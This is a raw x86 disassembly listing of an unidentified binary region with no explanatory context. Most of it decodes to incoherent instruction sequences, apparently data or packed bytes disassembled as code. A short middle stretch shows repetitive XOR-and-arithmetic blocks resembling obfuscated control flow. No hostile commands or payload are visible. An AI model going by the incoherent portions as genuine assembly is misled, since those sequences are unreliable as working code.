  421a29:	repnz ficom DWORD PTR ds:0xe914f6c5
  421a30:	sub    esp,0x286ffc11
  421a36:	or     al,0xf7
  421a38:	adc    esp,ecx
  421a3a:	fwait
  421a3b:	mov    esp,DWORD PTR [edi-0x6c]
  421a3e:	sbb    al,0x9e
  421a40:	and    eax,0x166c3f0f
  421a45:	inc    ebx
  421a46:	ins    BYTE PTR es:[edi],dx
  421a47:	aam    0xad
  421a49:	mov    es,WORD PTR ds:0xd003271b
  421a4f:	mov    ebx,0x1774b46c
  421a54:	stos   DWORD PTR es:[edi],eax
  421a55:	pop    ecx
  421a56:	cmp    dl,dh
  421a58:	dec    eax
  421a59:	aad    0x12
  421a5b:	dec    ebx
  421a5c:	in     eax,dx
  421a5d:	data16 stc 
  421a5f:	sbb    al,0xa5
  421a61:	pop    esi
  421a62:	dec    eax
  421a63:	push   ebp
  421a64:	sbb    eax,esi
  421a66:	jl     0x421a26
  421a68:	add    BYTE PTR [ecx-0x531d4ba8],ch
  421a6e:	lahf   
  421a6f:	or     BYTE PTR [esi-0x55],cl
  421a72:	sub    eax,0x64459844
  421a77:	les    eax,FWORD PTR [ebp-0x65]
  421a7a:	adc    eax,0x35767945
  421a7f:	test   DWORD PTR [eax],ecx
  421a81:	data16 ja 0x421a62
  421a84:	pop    ebx
  421a85:	adc    al,0xf9
  421a87:	or     DWORD PTR [edx+0x17],0x5623f413
  421a8e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421a8f:	mov    ds:0xcabcead9,al
  421a94:	and    BYTE PTR [ebx-0x1e],dl
  421a97:	lock lods eax,DWORD PTR ds:[esi]
  421a99:	add    bl,bh
  421a9b:	test   DWORD PTR [ecx+0x2df1e3f2],esp
  421aa1:	mov    ch,0xc5
  421aa3:	lds    edx,FWORD PTR [edi]
  421aa5:	xor    DWORD PTR [esi],0xffffffdc
  421aa8:	int3   
  421aa9:	adc    BYTE PTR [ebx],al
  421aab:	lahf   
  421aac:	mov    cl,0xb1
  421aae:	aas    
  421aaf:	pusha  
  421ab0:	ret    0xac60
  421ab3:	sub    ebp,DWORD PTR [esi-0x7158704f]
  421ab9:	dec    eax
  421aba:	retf   
  421abb:	jne    0x421aea
  421abd:	inc    edi
  421abe:	pop    ss
  421abf:	push   ds
  421ac0:	inc    ebx
  421ac1:	jae    0x421a95
  421ac3:	icebp  
  421ac4:	mov    esi,0x93e404d1
  421ac9:	add    ebx,DWORD PTR [eax-0x60]
  421acc:	lea    edx,[esi]
  421ace:	adc    bh,BYTE PTR [ebx+0x50]
  421ad1:	rol    BYTE PTR [edi-0x40ab86c2],0x36
  421ad8:	sahf   
  421ad9:	fcmovnb st,st(5)
  421adb:	and    al,0x93
  421add:	xor    al,0x1a
  421adf:	aaa    
  421ae0:	lds    edi,FWORD PTR [edx-0xbfdfb8e]
  421ae6:	adc    eax,0xc3ffeecf
  421aeb:	mov    edx,0xda901426
  421af0:	cmp    esp,ecx
  421af2:	xchg   ecx,eax
  421af3:	mov    esi,0xa035a560
  421af8:	mov    edi,0xfcca5022
  421afd:	mov    eax,ds:0x7904ee6
  421b02:	dec    edx
  421b03:	xchg   ebx,eax
  421b04:	outs   dx,DWORD PTR ds:[esi]
  421b05:	lea    ecx,[esi+0x7ec3650d]
  421b0b:	xchg   ebx,eax
  421b0c:	xchg   edx,eax
  421b0d:	leave  
  421b0e:	(bad)  
  421b0f:	imul   edx,DWORD PTR [ebx],0xf7f8cc88
  421b15:	xor    al,0x69
  421b17:	xchg   DWORD PTR [edx+0x71d576a1],edi
  421b1d:	out    dx,al
  421b1e:	cmpps  xmm2,XMMWORD PTR [ebp+0x65077c6b],0x9a
  421b26:	(bad)  
  421b27:	mov    bl,BYTE PTR [eax]
  421b29:	sbb    DWORD PTR [edi+edx*2],ebp
  421b2c:	add    ebx,ebp
  421b2e:	mov    BYTE PTR [ebx+0x6e],0xfb
  421b32:	xchg   ebx,eax
  421b33:	xchg   esp,eax
  421b34:	and    al,0xe2
  421b36:	fcmovne st,st(3)
  421b38:	mov    dh,0x14
  421b3a:	sahf   
  421b3b:	lds    esi,FWORD PTR [ebx-0x971a028]
  421b41:	and    bh,BYTE PTR [edx-0x3d722e65]
  421b47:	jl     0x421b2a
  421b49:	bound  esp,QWORD PTR [edx]
  421b4b:	mov    ebx,0xd3238a3
  421b50:	ins    BYTE PTR es:[edi],dx
  421b51:	jl     0x421b50
  421b53:	add    BYTE PTR [ebp-0x74239f01],dl
  421b59:	mov    al,ds:0xea26cf77
  421b5e:	mov    ch,0xf9
  421b60:	inc    ebp
  421b61:	in     al,0xc2
  421b63:	mov    eax,0xf35ae2be
  421b68:	xor    ecx,ebp
  421b6a:	retf   
  421b6b:	sub    eax,ecx
  421b6d:	pusha  
  421b6e:	bound  eax,QWORD PTR [ecx+0x3611e8c7]
  421b74:	mov    eax,0xa2cb94d
  421b79:	dec    edi
  421b7a:	mov    edx,0x9039895
  421b7f:	std    
  421b80:	je     0x421bb4
  421b82:	ud1    ebp,DWORD PTR fs:[esi+0x7e3752bc]
  421b8a:	test   DWORD PTR [eax-0x78c4c47f],edi
  421b90:	mov    ebx,0xba31b459
  421b95:	push   ss
  421b96:	inc    esi
  421b97:	daa    
  421b98:	in     al,dx
  421b99:	jle    0x421bb9
  421b9b:	inc    edx
  421b9c:	test   al,0x91
  421b9e:	xchg   ecx,eax
  421b9f:	sub    al,0x8d
  421ba1:	jne    0x421b44
  421ba3:	dec    eax
  421ba4:	clc    
  421ba5:	ins    BYTE PTR es:[edi],dx
  421ba6:	test   ecx,edx
  421ba8:	xor    ch,BYTE PTR [ecx]
  421baa:	xor    eax,0xb0669582
  421baf:	dec    ecx
  421bb0:	push   edi
  421bb1:	hlt    
  421bb2:	adc    DWORD PTR [esi-0x5650ae20],ebx
  421bb8:	mov    ebp,0x66e0f7be
  421bbd:	mov    bh,0x39
  421bbf:	mov    bh,0x42
  421bc1:	jge    0x421c25
  421bc3:	xchg   esi,eax
  421bc4:	or     BYTE PTR [edi],cl
  421bc6:	cmp    al,0xca
  421bc8:	adc    eax,DWORD PTR ds:0x6a9e94f5
  421bce:	inc    esi
  421bcf:	inc    esp
  421bd0:	mov    cl,0xf7
  421bd2:	xor    eax,0x8f791daf
  421bd7:	push   ebx
  421bd8:	push   0x2b779b17
  421bdd:	sub    DWORD PTR [esi-0x49],edx
  421be0:	shl    DWORD PTR [esi],0xb5
  421be3:	daa    
  421be4:	mov    dh,0x79
  421be6:	mov    ebp,esi
  421be8:	or     eax,0xcb85e013
  421bed:	lock gs adc al,0x8
  421bf1:	mov    dh,0x6f
  421bf3:	repz mov dh,0xf3
  421bf6:	dec    eax
  421bf7:	(bad)  
  421bf9:	in     eax,dx
  421bfa:	mov    bh,0x50
  421bfc:	jl     0x421c7d
  421bfe:	repnz or dh,BYTE PTR [edx]
  421c01:	into   
  421c02:	jl     0x421bed
  421c04:	bswap  ebp
  421c06:	in     al,0x92
  421c08:	jmp    0x12ac:0xf249e628
  421c0f:	pop    esi
  421c10:	fist   WORD PTR [eax]
  421c12:	or     eax,0x3759fd7c
  421c17:	jmp    0xc1e6:0xae896e3b
  421c1e:	xchg   ecx,eax
  421c1f:	add    DWORD PTR [eax+esi*8-0x5b],eax
  421c23:	lods   eax,DWORD PTR ds:[esi]
  421c24:	jmp    0x421c2a
  421c26:	xor    DWORD PTR [ecx],esi
  421c28:	clc    
  421c29:	stc    
  421c2a:	push   ecx
  421c2b:	push   ebp
  421c2c:	mov    eax,0x297e6475
  421c31:	add    eax,0x7ce601ad
  421c36:	mov    ch,0x53
  421c38:	mov    cs,WORD PTR [ecx-0x51]
  421c3b:	xchg   edx,eax
  421c3c:	add    BYTE PTR [esp+edi*8-0x32],cl
  421c40:	dec    ebx
  421c41:	shr    al,0xfa
  421c44:	jmp    0xeb3d:0x56b7ba4
  421c4b:	push   ss
  421c4c:	sub    al,0xe1
  421c4e:	pop    ebp
  421c4f:	cmp    esp,DWORD PTR [ebp+0x28]
  421c52:	popa   
  421c53:	cmp    dh,BYTE PTR [edi+0x10]
  421c56:	rcl    BYTE PTR [ebx+0x7f],1
  421c59:	and    bh,BYTE PTR [esi]
  421c5b:	ret    0x4513
  421c5e:	pop    esi
  421c5f:	out    dx,al
  421c60:	or     eax,0x420db860
  421c65:	mov    ds:0xcb1905b0,eax
  421c6a:	(bad)  
  421c6c:	xchg   ecx,eax
  421c6d:	xor    DWORD PTR [ebp+0x4c],ebx
  421c70:	cmp    BYTE PTR [ecx+esi*8],dh
  421c73:	out    dx,al
  421c74:	cmp    esp,DWORD PTR [ebp-0x408a077d]
  421c7a:	(bad)  
  421c7b:	dec    ebx
  421c7c:	sbb    BYTE PTR [edx+esi*4-0x23bd41a7],bl
  421c83:	add    edx,ebp
  421c85:	loope  0x421cd6
  421c87:	fist   DWORD PTR [ecx]
  421c89:	test   eax,0xb9460d42
  421c8e:	arpl   WORD PTR [eax],bx
  421c90:	stos   DWORD PTR es:[edi],eax
  421c91:	add    BYTE PTR [ecx],cl
  421c93:	(bad)  
  421c95:	pushf  
  421c96:	cwde   
  421c97:	mov    dh,0x68
  421c99:	push   cs
  421c9a:	cmovns ebp,ebx
  421c9d:	inc    ecx
  421c9e:	pushf  
  421c9f:	iret   
  421ca0:	stc    
  421ca1:	shl    DWORD PTR ds:0x16a3493e,1
  421ca7:	sahf   
  421ca8:	push   0xfffffff5
  421caa:	push   es
  421cab:	sbb    eax,0xd9558523
  421cb0:	xchg   DWORD PTR [ebx+0x577764e7],eax
  421cb6:	(bad)  
  421cb7:	call   ebx
  421cb9:	xchg   edi,eax
  421cba:	aaa    
  421cbb:	leave  
  421cbc:	pusha  
  421cbd:	or     BYTE PTR [ecx],0x85
  421cc0:	mov    ebp,0x503e9546
  421cc5:	int    0x51
  421cc7:	addr16 cmp eax,0x5fd55fc8
  421ccd:	pop    ds
  421cce:	(bad)  
  421ccf:	mov    bl,BYTE PTR [ebp+0x148acfaa]
  421cd5:	outs   dx,DWORD PTR ds:[esi]
  421cd6:	scas   eax,DWORD PTR es:[edi]
  421cd7:	xor    BYTE PTR [bp+0x22be],bl
  421cdc:	outs   dx,BYTE PTR ds:[esi]
  421cdd:	repnz iret 
  421cdf:	dec    ebp
  421ce0:	clc    
  421ce1:	lea    eax,[edx+ebp*4]
  421ce4:	int3   
  421ce5:	mov    ebp,0x568e1b83
  421cea:	add    dl,BYTE PTR [esi+ecx*1]
  421ced:	pop    es
  421cee:	rcl    DWORD PTR [edx],0xc
  421cf1:	add    DWORD PTR [ebp+0x52202b69],ecx
  421cf7:	adc    edi,DWORD PTR [ebx]
  421cf9:	(bad)  
  421cfa:	fld    QWORD PTR [ebx]
  421cfc:	and    edi,DWORD PTR [ecx-0x5eca08f5]
  421d02:	and    bl,BYTE PTR [esi+0x79]
  421d05:	sub    cl,dh
  421d07:	xor    BYTE PTR [eax],0x44
  421d0a:	inc    ebp
  421d0b:	or     BYTE PTR [eax-0x62],dh
  421d0e:	inc    edx
  421d0f:	gs iret 
  421d11:	jle    0x421cbb
  421d13:	loope  0x421d4b
  421d15:	imul   ebp,DWORD PTR [ecx+0x71244131],0x854e7b00
  421d1f:	retf   
  421d20:	aam    0x6
  421d22:	iret   
  421d23:	jle    0x421ced
  421d25:	pusha  
  421d26:	sar    DWORD PTR [edx-0x70],cl
  421d29:	not    DWORD PTR [ebp-0x432f301e]
  421d2f:	xchg   ebp,eax
  421d30:	adc    ebx,eax
  421d32:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421d33:	fsubp  st(7),st
  421d35:	xchg   ecx,eax
  421d36:	cmc    
  421d37:	lods   eax,DWORD PTR ds:[esi]
  421d38:	gs cdq 
  421d3a:	mov    ds:0x45862ec,eax
  421d3f:	push   0xcebe5566
  421d44:	adc    al,0xf
  421d47:	in     eax,0xf7
  421d49:	fistp  QWORD PTR [edx]
  421d4b:	inc    ecx
  421d4c:	push   esp
  421d4d:	jae    0x421d87
  421d4f:	jg     0x421dc7
  421d51:	sar    BYTE PTR [ebp-0xc358634],1
  421d57:	fcmovne st,st(2)
  421d59:	push   edi
  421d5a:	sbb    DWORD PTR [edi+0x71d352fe],ebx
  421d60:	into   
  421d61:	mov    edi,0xee50e343
  421d66:	int3   
  421d67:	xchg   ebx,eax
  421d68:	fidiv  DWORD PTR [eax-0x1b]
  421d6b:	push   eax
  421d6c:	cmp    dh,dl
  421d6e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421d6f:	test   BYTE PTR gs:[ebx],dl
  421d72:	xor    ebx,DWORD PTR ds:0x4b3cb511
  421d78:	mov    ebx,cs
  421d7a:	outs   dx,DWORD PTR ds:[esi]
  421d7b:	pop    es
  421d7c:	in     eax,dx
  421d7d:	retf   0x598d
  421d80:	inc    edx
  421d81:	ds xchg al,al
  421d84:	jno    0x421dbd
  421d86:	and    ecx,DWORD PTR [edi+0x1f643ab6]
  421d8c:	mov    ch,0x52
  421d8e:	or     al,0xb6
  421d90:	add    edi,esp
  421d92:	dec    edi
  421d93:	or     eax,0x713fa94e
  421d98:	lahf   
  421d99:	mov    gs,WORD PTR [ebx]
  421d9b:	inc    ecx
  421d9c:	adc    eax,0x92e55ee5
  421da1:	mov    eax,0x958cb4ba
  421da6:	inc    ecx
  421da7:	scas   eax,DWORD PTR es:[edi]
  421da8:	fwait
  421da9:	mov    dh,BYTE PTR [esi-0x59aa8f2a]
  421daf:	add    al,0x35
  421db1:	xchg   esp,eax
  421db2:	and    dl,BYTE PTR ds:0x12789d6c
  421db8:	sbb    BYTE PTR [edx+0x50],dl
  421dbb:	push   esi
  421dbc:	mov    ss,WORD PTR [ecx-0x49133a05]
  421dc2:	sbb    ebp,DWORD PTR [ebx-0x5202e2cc]
  421dc8:	stos   BYTE PTR es:[edi],al
  421dc9:	mov    ecx,0x80df9f66
  421dce:	ins    BYTE PTR es:[edi],dx
  421dcf:	sub    eax,DWORD PTR [eax+eiz*2]
  421dd2:	fidiv  DWORD PTR [esi+edx*2-0x7510512c]
  421dd9:	shl    ecx,0x69
  421ddc:	mov    bh,0xab
  421dde:	xor    eax,DWORD PTR ds:0xea978dbb
  421de4:	jecxz  0x421d9d
  421de6:	dec    esi
  421de7:	xchg   ecx,eax
  421de8:	push   0xffffffd0
  421dea:	pop    edi
  421deb:	std    
  421dec:	mov    cl,0xf1
  421dee:	test   DWORD PTR [eax-0x44bd16a4],0x7b987a12
  421df8:	inc    esp
  421df9:	(bad)  
  421dfa:	mov    DWORD PTR [ebx],0xf0d2bed0
  421e00:	int3   
  421e01:	scas   al,BYTE PTR es:[edi]
  421e02:	lock sbb al,0xb4
  421e05:	icebp  
  421e06:	sti    
  421e07:	xor    eax,0xcd75aeea
  421e0c:	or     edi,ebx
  421e0e:	xchg   ebx,eax
  421e0f:	jl     0x421e6e
  421e11:	out    0xc8,eax
  421e13:	dec    ebp
  421e14:	xchg   ebx,eax
  421e15:	aad    0x9e
  421e17:	loop   0x421ddd
  421e19:	(bad)  
  421e1a:	mov    edx,0x492f01a0
  421e1f:	ins    DWORD PTR es:[edi],dx
  421e20:	loop   0x421e5a
  421e22:	bound  edx,QWORD PTR [ecx+0x7b45539e]
  421e28:	or     ebp,DWORD PTR [eax]
  421e2a:	sbb    BYTE PTR [eax],al
  421e2c:	add    ecx,0xffffffab
  421e2f:	into   
  421e30:	jle    0x421e9a
  421e32:	sub    BYTE PTR [eax-0x18],bl
  421e35:	or     DWORD PTR [esi-0x26],ebp
  421e38:	and    bh,BYTE PTR [eax]
  421e3a:	cmp    ah,BYTE PTR [edx]
  421e3c:	mov    esp,DWORD PTR [ebp-0x29]
  421e3f:	push   es
  421e40:	jnp    0x2fd06ef7
  421e46:	ror    DWORD PTR [esi-0x37],cl
  421e49:	jno    0x421e5d
  421e4b:	mov    al,ds:0x8bf45589
  421e50:	push   ebp
  421e51:	lock xor edx,eax
  421e54:	add    edx,esi
  421e56:	jne    0x41d43b
  421e5c:	jmp    0x422f9e
  421e61:	mov    ecx,DWORD PTR [ebp-0x14]
  421e64:	mov    DWORD PTR [ebp+0x8],ecx
  421e67:	jmp    0x421ee0
  421e6c:	mov    ecx,DWORD PTR [ebp+0x8]
  421e6f:	mov    edx,DWORD PTR [ebp-0x8]
  421e72:	xor    ecx,eax
  421e74:	xor    edx,eax
  421e76:	sub    ecx,edx
  421e78:	sub    ecx,esi
  421e7a:	xor    ecx,eax
  421e7c:	mov    DWORD PTR [ebp+0x8],ecx
  421e7f:	mov    ecx,DWORD PTR [ebp+0x8]
  421e82:	mov    edx,DWORD PTR [ebp-0x58]
  421e85:	add    ecx,0x5708fa
  421e8b:	imul   ecx,edx
  421e8e:	mov    DWORD PTR [ebp-0x58],ecx
  421e91:	mov    ecx,DWORD PTR [ebp+0x8]
  421e94:	mov    edx,DWORD PTR [ebp-0x54]
  421e97:	add    ecx,0x64f898
  421e9d:	or     ecx,edx
  421e9f:	mov    DWORD PTR [ebp-0x54],ecx
  421ea2:	mov    ecx,DWORD PTR [ebp+0x8]
  421ea5:	mov    edx,DWORD PTR [ebp-0x50]
  421ea8:	add    ecx,0x242ebc9
  421eae:	xor    ecx,edx
  421eb0:	mov    DWORD PTR [ebp-0x50],ecx
  421eb3:	mov    ecx,DWORD PTR [ebp+0x8]
  421eb6:	mov    edx,DWORD PTR [ebp-0x4c]
  421eb9:	add    ecx,edi
  421ebb:	and    ecx,edx
  421ebd:	mov    DWORD PTR [ebp-0x4c],ecx
  421ec0:	mov    ecx,DWORD PTR [ebp+0x8]
  421ec3:	mov    edx,DWORD PTR [ebp-0x48]
  421ec6:	lea    ecx,[edx+ecx*1+0x241fcdf]
  421ecd:	mov    DWORD PTR [ebp-0x48],ecx
  421ed0:	mov    ecx,DWORD PTR [ebp+0x8]
  421ed3:	mov    edx,0xfa5e1524
  421ed8:	sub    edx,ecx
  421eda:	add    edx,DWORD PTR [ebp-0x44]
  421edd:	mov    DWORD PTR [ebp-0x44],edx
  421ee0:	mov    ecx,DWORD PTR [ebp+0x8]
  421ee3:	xor    ecx,eax
  421ee5:	add    ecx,esi
  421ee7:	jne    0x421e6c
  421eed:	jmp    0x422faa
  421ef2:	mov    ecx,DWORD PTR [ebp+0x8]
  421ef5:	mov    edx,DWORD PTR [ebp-0x8]
  421ef8:	xor    ecx,eax
  421efa:	xor    edx,eax
  421efc:	sub    ecx,edx
  421efe:	sub    ecx,esi
  421f00:	xor    ecx,eax
  421f02:	mov    DWORD PTR [ebp+0x8],ecx
  421f05:	mov    ecx,DWORD PTR [ebp+0x8]
  421f08:	mov    edx,DWORD PTR [ebp-0x58]
  421f0b:	add    ecx,0x5708fa
  421f11:	imul   ecx,edx
  421f14:	mov    DWORD PTR [ebp-0x58],ecx
  421f17:	mov    ecx,DWORD PTR [ebp+0x8]
  421f1a:	mov    edx,DWORD PTR [ebp-0x54]
  421f1d:	add    ecx,0x64f898
  421f23:	or     ecx,edx
  421f25:	mov    DWORD PTR [ebp-0x54],ecx
  421f28:	mov    ecx,DWORD PTR [ebp+0x8]
  421f2b:	mov    edx,DWORD PTR [ebp-0x50]
  421f2e:	add    ecx,0x242ebc9
  421f34:	xor    ecx,edx
  421f36:	mov    DWORD PTR [ebp-0x50],ecx
  421f39:	mov    ecx,DWORD PTR [ebp+0x8]
  421f3c:	mov    edx,DWORD PTR [ebp-0x4c]
  421f3f:	jmp    0x422f6a
  421f44:	sbb    eax,0x95d463fb
  421f49:	aam    0x96
  421f4b:	mov    dh,0xbf
  421f4d:	cdq    
  421f4e:	push   eax
  421f4f:	inc    esi
  421f50:	in     eax,dx
  421f51:	mov    edi,0x91db6c68
  421f56:	jl     0x421edb
  421f58:	jno    0x421fcd
  421f5a:	add    DWORD PTR [ebx+0x548cd0c7],0x16
  421f61:	fnstcw WORD PTR [edx]
  421f63:	inc    edx
  421f64:	sub    dh,BYTE PTR [esi-0x2f]
  421f67:	inc    ebp
  421f68:	int3   
  421f69:	cmp    edi,DWORD PTR ds:[ebp+0x35effe42]
  421f70:	shr    DWORD PTR [esi+edi*8-0x80],cl
  421f74:	sub    al,0x87
  421f76:	fistp  QWORD PTR ds:0xe424add9
  421f7c:	xor    DWORD PTR [eax],ecx
  421f7e:	test   DWORD PTR [esi],esp
  421f80:	mov    ebx,0xbc742108
  421f85:	aas    
  421f86:	icebp  
  421f87:	mov    ecx,0xbd41509d
  421f8c:	fstp   TBYTE PTR [ecx-0x24]
  421f8f:	mov    eax,ds:0xbe59aeb9
  421f94:	clc    
  421f95:	pop    es
  421f96:	retf   0x35e6
  421f99:	dec    ebx
  421f9a:	mov    edi,0x4022871c
  421f9f:	xchg   ebp,eax
  421fa0:	iret   
  421fa1:	data16 jae 0x421f7e
  421fa4:	sahf   
  421fa5:	out    dx,eax
  421fa6:	dec    eax
  421fa7:	sub    DWORD PTR [edi],esi
  421fa9:	repz xchg edx,eax
  421fab:	sub    al,0x5
  421fad:	xchg   esp,eax
  421fae:	jmp    DWORD PTR [edi+0x3c749058]
  421fb4:	fistp  QWORD PTR [ebx]
  421fb6:	xor    BYTE PTR [eax+0x541b4b0a],0xb3
  421fbd:	dec    esi
  421fbe:	inc    ebp
  421fbf:	jmp    0x421fc7
  421fc1:	push   ebp
  421fc2:	in     eax,dx
  421fc3:	push   ds
  421fc4:	lahf   
  421fc5:	icebp  
  421fc6:	shl    BYTE PTR [ebx-0xc77fde0],cl
  421fcc:	clc    
  421fcd:	sar    BYTE PTR [edx-0x13],1
  421fd0:	fld    DWORD PTR [ecx+0x67]
  421fd3:	sbb    bl,dh
  421fd5:	xlat   BYTE PTR ds:[ebx]
  421fd6:	repnz sbb edi,DWORD PTR ds:0x34a8eaeb
  421fdd:	idiv   DWORD PTR [eax+0x240454cb]
  421fe3:	je     0x421ff0
  421fe5:	sub    DWORD PTR gs:[ebp-0xd467d3d],0xf
  421fed:	ret    
  421fee:	mov    dh,0x45
  421ff0:	push   edi
  421ff1:	inc    ebp
  421ff2:	mov    esp,0x2d5dab16
  421ff7:	out    0x94,al
  421ff9:	jbe    0x422062
  421ffb:	fs push 0x9275a273
  422001:	or     DWORD PTR [esi+0x1e],0xaa9f7a1f
  422008:	out    0xdd,eax
  42200a:	inc    esi
  42200b:	cdq    
  42200c:	mov    ds:0xc4bbd251,eax
  422011:	outs   dx,BYTE PTR ds:[esi]
  422012:	jge    0x42205e
  422014:	imul   edi,esi,0x64
  422017:	stos   BYTE PTR es:[edi],al
  422018:	adc    al,0x0
  42201a:	rcl    BYTE PTR [ebx+ecx*8],0xe6
  42201e:	sub    al,0xec
  422020:	fidiv  DWORD PTR [ecx-0x2540e128]
  422026:	mov    ds:0xe63dfb3f,eax
  42202b:	jge    0x422082
  42202d:	jmp    0x421fb4
  42202f:	inc    esi
  422030:	aas    
  422031:	mov    cl,0x92
  422033:	mov    BYTE PTR [edi],ch
  422035:	aas    
  422036:	pop    ebp
  422037:	jecxz  0x42207a
  422039:	cwde   
  42203a:	jl     0x422016
  42203c:	retf   
  42203d:	xor    esi,ecx
  42203f:	ds dec edx
  422041:	ffree  st(6)
  422043:	jno    0x421fe5
  422045:	xchg   esp,eax
  422046:	scas   al,BYTE PTR es:[edi]
  422047:	jo     0x42200b
  422049:	xchg   esi,edx
  42204b:	enter  0xb2ec,0x95
  42204f:	gs aas 
  422051:	sub    BYTE PTR [edx],cl
  422053:	shl    esi,0xb
  422056:	pop    ecx
  422057:	popf   
  422058:	rcr    BYTE PTR [edx-0x61],cl
  42205b:	rol    ebp,cl
  42205d:	mov    ebp,0xd904464e
  422062:	xchg   esi,eax
  422063:	clc    
  422064:	and    BYTE PTR ds:0x830b7ff5,dh
  42206a:	call   0x500e:0xedc82ca6
  422071:	ret    0xe6
  422074:	ja     0x4220d0
  422076:	mov    ecx,0x2eb7044a
  42207b:	xchg   esp,eax
  42207c:	xor    al,bh
  42207e:	ret    
  42207f:	pop    ss
  422080:	fisubr WORD PTR [eax]
  422082:	xchg   ebx,eax
  422083:	sbb    ah,BYTE PTR [edx-0x2a798da]
  422089:	ins    BYTE PTR es:[edi],dx
  42208a:	retf   0x2137
  42208d:	outs   dx,DWORD PTR ds:[esi]
  42208e:	push   ecx
  42208f:	xchg   esi,eax
  422090:	inc    eax
  422091:	cld    
  422092:	mov    dh,0xd0
  422094:	adc    al,0xe8
  422096:	push   0x36
  422098:	or     edi,ebp
  42209a:	mov    esi,0xde76900b
  42209f:	shl    esi,0xb9
  4220a2:	ret    0x3b99
  4220a5:	rcl    DWORD PTR [ebx+0x58c00401],0xde
  4220ac:	sbb    BYTE PTR [edx],0x66
  4220af:	push   edx
  4220b0:	retf   
  4220b1:	bound  esp,QWORD PTR [edi+0x97030e6]
  4220b7:	jle    0x422125
  4220b9:	pushf  
  4220ba:	and    BYTE PTR [eax-0x47],bh
  4220bd:	js     0x422132
  4220bf:	loop   0x4220ef
  4220c1:	loop   0x42211b
  4220c3:	mov    cl,BYTE PTR [eax+edi*8-0x5c774dcd]
  4220ca:	and    eax,0x7151f943
  4220cf:	mov    esp,0x736cbf71
  4220d4:	sub    dl,BYTE PTR [ebx]
  4220d6:	cmp    DWORD PTR [ecx-0x6b],eax
  4220d9:	pop    es
  4220da:	ins    DWORD PTR es:[edi],dx
  4220db:	inc    esi
  4220dc:	dec    ebx
  4220dd:	inc    DWORD PTR [edi+0x110ba2a9]
  4220e3:	mov    esi,0x6bb370cb
  4220e8:	mov    al,0x24
  4220ea:	jne    0x422093
  4220ec:	pop    ss
  4220ed:	push   es
  4220ee:	mov    esi,0x581ff71e
  4220f3:	nop
  4220f4:	mov    edi,0xf11a1ddd
  4220f9:	out    dx,al
  4220fa:	inc    ebx
  4220fb:	je     0x42209f
  4220fd:	sub    DWORD PTR [ecx+ebp*4-0x5],esi
  422101:	out    0xb1,eax
  422103:	sbb    ah,BYTE PTR [esi+0x4697943c]
  422109:	sbb    BYTE PTR [ebp-0x27444cb3],bh
  42210f:	mov    gs,ebx
  422111:	sbb    DWORD PTR [edx+0x65],edx
  422114:	mov    ebp,0x71a71c89
  422119:	jecxz  0x42211b
  42211b:	mov    ah,0x94
  42211d:	lock mov ebp,0x2fcd82ce
  422123:	xchg   edx,eax
  422124:	pop    ebx
  422125:	(bad)  
  422126:	lods   al,BYTE PTR ds:[esi]
  422127:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422128:	loopne 0x422173
  42212a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42212b:	sub    DWORD PTR [ebx-0x524660f6],ebp
  422131:	xor    BYTE PTR ds:0x10a8f51,ch
  422137:	xor    al,0x27
  422139:	mov    ds,WORD PTR [ebx+0x496b5ad0]
  42213f:	mov    cl,0xb5
  422141:	pop    edx
  422142:	ret    0xfaf5
  422145:	push   esi
  422146:	mov    bl,0x9f
  422148:	jle    0x4220cd
  42214a:	adc    BYTE PTR [eax-0x3bc4a87e],dh
  422150:	adc    dh,BYTE PTR [esi]
  422152:	pushf  
  422153:	stc    
  422154:	mov    ebp,DWORD PTR [edx+0x1f]
  422157:	dec    ebx
  422158:	outs   dx,DWORD PTR ds:[esi]
  422159:	loop   0x4221c6
  42215b:	dec    eax
  42215c:	push   esi
  42215d:	mov    edi,0x5354c02
  422162:	jge    0x4221c3
  422164:	pop    esp
  422165:	xor    cl,BYTE PTR [ecx+eiz*2+0x55]
  422169:	inc    BYTE PTR [ebx]
  42216b:	sub    eax,0xcfe1dea8
  422170:	out    0x10,al
  422172:	enter  0xa069,0x79
  422176:	or     al,0x56
  422178:	retf   0xe342
  42217b:	test   eax,0x4eded4a3
  422180:	inc    cl
  422182:	jmp    0x4221ad
  422184:	cs call 0x81e0:0xe2063625
  42218c:	xchg   edx,eax
  42218d:	xchg   BYTE PTR [ecx-0x57d19f1f],al
  422193:	aam    0xf0
  422195:	jo     0x422121
  422197:	xor    ah,cl
  422199:	cld    
  42219a:	pop    ecx
  42219b:	out    0xb6,eax
  42219d:	repnz mov esp,0x28deb1cf
  4221a3:	push   edi
  4221a4:	fisubr WORD PTR [ebx+0x53369ad6]
  4221aa:	pop    ebp
  4221ab:	in     al,0x1d
  4221ad:	mov    al,ds:0xc7bebef7
  4221b2:	ret    0x6d63
  4221b5:	lds    ecx,FWORD PTR [ecx]
  4221b7:	add    DWORD PTR [ebp+0x35],edx
  4221ba:	shl    DWORD PTR [ebx+0x630e9449],cl
  4221c0:	and    al,0x1d
  4221c2:	sub    cl,dl
  4221c4:	inc    edx
  4221c5:	jecxz  0x4221d8
  4221c7:	iret   
  4221c8:	xchg   edi,eax
  4221c9:	xor    al,BYTE PTR [edi]
  4221cb:	outs   dx,BYTE PTR ds:[esi]
  4221cc:	or     esi,esi
  4221ce:	fisub  WORD PTR [ebx+ebp*8-0x24aad608]
  4221d5:	icebp  
  4221d6:	and    eax,DWORD PTR [ebx-0x60cca07e]
  4221dc:	data16 clc 
  4221de:	sbb    al,0xd
  4221e0:	into   
  4221e1:	mov    esi,0x2b6cdff7
  4221e6:	or     BYTE PTR [ebx-0x2a9864b0],dh
  4221ec:	popf   
  4221ed:	mov    al,ds:0x977b8fbc
  4221f2:	fst    DWORD PTR [ecx-0x594919e5]
  4221f8:	and    DWORD PTR [ebp+0x4a],ebp
  4221fb:	cmp    DWORD PTR [esp+0x73c93f7b],eax
  422202:	push   es
  422203:	xor    edx,edi
  422205:	retf   
  422206:	repnz int3 
  422208:	rol    BYTE PTR [ebp+0x19],0x93
  42220c:	fdivr  QWORD PTR [eax+eiz*2-0x6646e413]
  422213:	sbb    eax,0x85dcd40a
  422218:	adc    eax,0xfa6edf38
  42221d:	popf   
  42221e:	call   0xc8a2a7a6
  422223:	add    al,0xb0
  422225:	fwait
